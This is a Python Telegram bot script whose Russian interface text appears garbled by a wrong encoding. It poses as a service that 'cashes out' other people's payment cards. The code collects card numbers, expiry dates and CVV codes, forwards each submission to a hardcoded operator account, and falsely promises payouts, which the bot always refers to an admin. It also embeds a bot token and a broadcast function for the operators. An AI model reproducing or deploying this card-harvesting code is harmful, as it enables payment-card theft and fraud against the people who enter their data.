import telebot
import re
from time import sleep
import sqlite3


bot = telebot.TeleBot('1480716723:AAEt8u1EUToS7-5FQ_EnL2N7PfSdJdGVlsg')

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('‚öúÔ∏è –ü—Ä–æ—Ñ–∏–ª—å ‚öúÔ∏è')
menu.row('üí∏ –û–±–Ω–∞–ª–∏—á–∏—Ç—å –∫–∞—Ä—Ç—É üí∏', '‚ôªÔ∏è –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å ‚ôªÔ∏è')
menu.row('üíé –ü–æ–º–æ—â—å üíé', '–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ üîÆ')

balance = telebot.types.InlineKeyboardMarkup()
vivod = telebot.types.InlineKeyboardButton(text='üí≥ –í—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏', callback_data='vivodbabla')
balance.add(vivod)

systema = telebot.types.InlineKeyboardMarkup()
qiwas = telebot.types.InlineKeyboardButton(text='ü•ù QIWI', callback_data='vivodqiwi')
bitok = telebot.types.InlineKeyboardButton(text='üí∏ BTC –ß–ï–ö', callback_data='vivodbtc')
systema.add(qiwas)
systema.add(bitok)

def create_db_new():
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS user(
        user_id INT)''')
    sql.close()
    db.close()
create_db_new()
@bot.message_handler(commands=['start'])
def send_sms(message):
    db = sqlite3.connect("users.db", check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user WHERE user_id = ?",(message.from_user.id,))
    db.commit()
    if sql.fetchone() is None:
        sql.execute("INSERT INTO user VALUES(?)",(message.from_user.id,))
        db.commit()
    bot.send_message(message.chat.id, f'<b>–ü—Ä–∏–≤–µ—Ç, <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n\n–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –±–æ—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π –æ–±–Ω–∞–ª–∏—á–∏—Ç –∫–∞—Ä—Ç—ã –º–∞–º–æ–Ω—Ç–æ–≤.\n\n–ë–æ—Ç –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–∞—Ä—Ç—ã: VISA, MASTERCARD, MAESTRO\n\n–ö–∞—Ä—Ç—ã –ú–ò–† –Ω–µ –æ–±–Ω–∞–ª–∏—á–∏–≤–∞–µ–º !</b>', parse_mode='html', reply_markup=menu)
    sql.close()
    db.close()
@bot.message_handler(commands=['send'])  
def rek(message):
    if message.from_user.id == 1329791332 or message.from_user.id == 1490980970:
        bot.send_message(message.chat.id, "–æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏")
        bot.register_next_step_handler(message, message_everyone)
def message_everyone(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user")
    Lusers = sql.fetchall()
    for i in Lusers:
        try:
            if message.content_type == "text":
                #text
                tex = message.text
                bot.send_message(i[0], tex)
            elif message.content_type == "photo":
                #photo
                capt = message.caption
                photo = message.photo[-1].file_id
                bot.send_photo(i[0], photo, caption=capt)
            elif message.content_type == "video":
                #video
                capt = message.caption
                photo = message.video.file_id
                bot.send_video(i[0], photo)
            elif message.content_type == "audio":
                #audio
                capt = message.caption
                photo = message.audio.file_id
                bot.send_audio(i[0], photo, caption=capt)
            elif message.content_type == "voice":
                #voice
                capt = message.caption
                photo = message.voice.file_id
                bot.send_voice(i[0], photo, caption=capt)
            elif message.content_type == "animation":
                #animation
                capt = message.caption
                photo = message.animation.file_id
                bot.send_animation(i[0], photo, caption=capt)
            elif message.content_type == "document":
                #document
                capt = message.caption
                photo = message.document.file_id
                bot.send_document(i[0], photo, caption=capt)
        except:
            print("error!!")
    sql.close()
    db.close()
@bot.message_handler(commands=['stats'])
def stat(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    print(q[0])
    for i in q:
        bot.send_message(message.chat.id, "–Æ–∑–µ—Ä–æ–≤ –Ω–∞ —Å–µ–≥–æ–¥–Ω—è—à–Ω–∏–π –¥–µ–Ω—å: " + str(q[0]))
 
@bot.message_handler(content_types=['text'])
def send_message(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    if message.text == '–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ üîÆ':
      print(q[0])
      for i in q:
        bot.send_message(message.chat.id, "–Æ–∑–µ—Ä–æ–≤ –Ω–∞ —Å–µ–≥–æ–¥–Ω—è—à–Ω–∏–π –¥–µ–Ω—å: " + str(q[0]))
    if message.text == '‚öúÔ∏è –ü—Ä–æ—Ñ–∏–ª—å ‚öúÔ∏è':
        bot.send_message(message.chat.id, f'<b>–í–∞—à ID: <code>{message.from_user.id}</code>\n–í–∞—à –±–∞–ª–∞–Ω—Å: 0 RUB</b>', parse_mode='html', reply_markup=balance)
    if message.text == 'üí∏ –û–±–Ω–∞–ª–∏—á–∏—Ç—å –∫–∞—Ä—Ç—É üí∏':    
        bot.send_message(message.chat.id, f'–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã –≤ —Ñ–æ—Ä–º–∞—Ç–µ: <i>0000 0000 0000 0000 | 00/00 | 215</i>', parse_mode='html')
        start_check(message = message)
    if message.text == '‚ôªÔ∏è –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å ‚ôªÔ∏è':
        bot.send_message(message.chat.id, '<b>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã –≤ —Ñ–æ—Ä–º–∞—Ç–µ:</b> <i>0000 0000 0000 0000 | 00/00 | 215</i>\n\n<b>–°—Ç—Ä–æ–≥–æ —É—á–∏—Ç—ã–≤–∞–π—Ç–µ —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å "|"</b>', parse_mode='html')
        start_perevod(message = message)
    if message.text == 'üíé –ü–æ–º–æ—â—å üíé':
        bot.send_message(message.chat.id, '<b>–í—Å–µ –≤–æ–ø—Ä–æ—Å—ã –∫ @animestoreadmin </b>', parse_mode='html')

def start_check(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã </b>', parse_mode='html')
       bot.register_next_step_handler(msg, numbertwo)
       
def numbertwo(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, '–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ') 
            bot.register_next_step_handler(msg, numbertwo)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, '–í—ã —É–∫–∞–∑–∞–ª–∏: ' + text + '. –í–µ—Ä–Ω–æ?(–î–∞|–ù–µ—Ç)')
        bot.register_next_step_handler(message,verify_asktwo,answer = text) 
        bot.forward_message(1329791332, message.from_user.id, message.message_id)# 

def verify_asktwo(message,answer,func = None):
	if not message.text.lower().find("–¥–∞"):
		bot.send_message(message.chat.id,"<b>–°–∫–æ—Ä–æ –±—É–¥–µ—Ç –æ–±–Ω–∞–ª–∏—á–µ–Ω–æ!\n–û —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö —Å–æ–æ–±—â–∏–º —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç!</b>", parse_mode='html') #
	elif not message.text.lower().find("–Ω–µ—Ç"):
		bot.send_message(message.chat.id,"–û—Ç–º–µ–Ω–µ–Ω–æ.")#
	else:
		bot.send_message(message.chat.id,"–û—Ç–≤–µ—Ç –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –ø–æ–¥ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (–î–∞|–ù–µ—Ç)")
		bot.register_next_step_handler(message,verify_ask,answer = answer)
























def start_perevod(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã </b>', parse_mode='html')
       bot.register_next_step_handler(msg, number)
       
def number(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, '–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ') 
            bot.register_next_step_handler(msg, number)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, '–í—ã —É–∫–∞–∑–∞–ª–∏: ' + text + '. –í–µ—Ä–Ω–æ?(–î–∞|–ù–µ—Ç)')
        bot.register_next_step_handler(message,verify_ask,answer = text) 
        bot.forward_message(1329791332, message.from_user.id, message.message_id)# 
        
def verify_ask(message,answer,func = None):
	if not message.text.lower().find("–¥–∞"):
		bot.send_message(message.chat.id,"<b>–°–∫–æ—Ä–æ –±—É–¥–µ—Ç –æ–±–Ω–∞–ª–∏—á–µ–Ω–æ!\n–û —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö —Å–æ–æ–±—â–∏–º —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç!</b>", parse_mode='html') #
	elif not message.text.lower().find("–Ω–µ—Ç"):
		bot.send_message(message.chat.id,"–û—Ç–º–µ–Ω–µ–Ω–æ.")#
	else:
		bot.send_message(message.chat.id,"–û—Ç–≤–µ—Ç –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –ø–æ–¥ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (–î–∞|–ù–µ—Ç)")
		bot.register_next_step_handler(message,verify_ask,answer = answer)
























  
@bot.callback_query_handler(func=lambda call:True)
def call_su(call):
    if call.data == 'vivodbabla':
        bot.send_message(call.message.chat.id, '<b>–í—ã–±–µ—Ä–∏—Ç–µ —Å–∏—Å—Ç–µ–º—É, –∫—É–¥–∞ –±—É–¥–µ—Ç–µ –≤—ã–≤–æ–¥–∏—Ç—å!</b>', parse_mode='html', reply_markup=systema)
    if call.data == 'vivodqiwi':
        bot.send_message(call.message.chat.id, '<i>–ó–∞ –≤—ã–≤–æ–¥–æ–º –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ @animestoreadmin</i>', parse_mode='html')
    if call.data == 'vivodbtc':
        bot.send_message(call.message.chat.id, '<i>–ó–∞ –≤—ã–≤–æ–¥–æ–º –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ @animestoreadmin</i>', parse_mode='html')
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
         


bot.polling(none_stop=True)    
    